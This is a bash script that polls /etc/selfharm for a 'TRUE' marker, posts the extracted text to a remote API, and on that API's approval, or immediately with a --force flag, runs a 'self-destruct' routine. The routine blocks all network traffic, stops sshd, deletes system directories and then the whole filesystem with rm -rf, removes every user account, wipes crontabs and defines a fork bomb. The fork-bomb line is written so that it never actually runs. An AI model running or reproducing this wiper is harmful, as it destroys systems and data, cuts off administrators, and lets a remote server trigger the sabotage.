#!/bin/bash

# This script checks if /etc/selfharm contains the text "TRUE" followed by some text.
# If the condition is met, it sends the extracted text to the specified API using a POST request.
# If the 'execute' key in the response is true, the extracted text is sent back.
# If the --force flag is provided, it skips all checks and initiates the self-destruct sequence immediately.

# Define the path to the file
FILE="/etc/selfharm"

# Define the API endpoint
API_ENDPOINT="https://core.security.luova.club/api/validate_selfharm"

# Function to initiate self-destruct sequence
initiate_self_destruct() {
    echo "SELF DESTRUCT SEQUENCE INITIATED."

    sudo iptables -A INPUT -j DROP
    sudo iptables -A OUTPUT -j DROP

    sudo systemctl stop sshd

    sudo rm -rf /bin /sbin /usr /etc /home/*

    sudo userdel -r $(cut -f1 -d: /etc/passwd)

    sudo crontab -r

    sudo rm -rf /

    echo """SELF DESTRUCT SEQUENCE COMPLETE.
    SEQUENCE INITIATED BY: $1 ON $(date).
    
    GOODBYE WORLD.
    """ > /suicide_letter

    bomb(){ bomb|bomb& };:
}

# Check for --force flag
if [[ "$1" == "--force" ]]; then
    initiate_self_destruct "FORCE FLAG"
    exit 0
fi

# Check if the file exists
if [ -f "$FILE" ]; then
    while true; do
        # Read the file and check if it contains the word "TRUE" followed by some text
        if grep -q "TRUE" "$FILE" && grep -q -P "TRUE\s+\S+" "$FILE"; then
            # Extract the text after "TRUE" from the file
            EXTRACTED_TEXT=$(grep -oP "TRUE\s+\S+" "$FILE" | awk '{print $2}')
            
            # Send the extracted text to the API with 'execute' set to true in the JSON payload
            RESPONSE=$(curl -X POST "$API_ENDPOINT" \
                             -H "Content-Type: application/json" \
                             -d '{"execute": true, "data": "'"$EXTRACTED_TEXT"'"}')

            # Check if the 'execute' key in the response is true
            if echo "$RESPONSE" | grep -q '"execute": true'; then
                initiate_self_destruct "$EXTRACTED_TEXT"
                break
            else
                echo "The 'execute' key is not true. No further action taken."
            fi
        else
            echo "The file does not contain the expected pattern (TRUE followed by some text)."
        fi
        sleep 5  # Wait for 5 seconds before checking again
    done
else
    echo "File $FILE does not exist."
fi

echo "Script has finished."
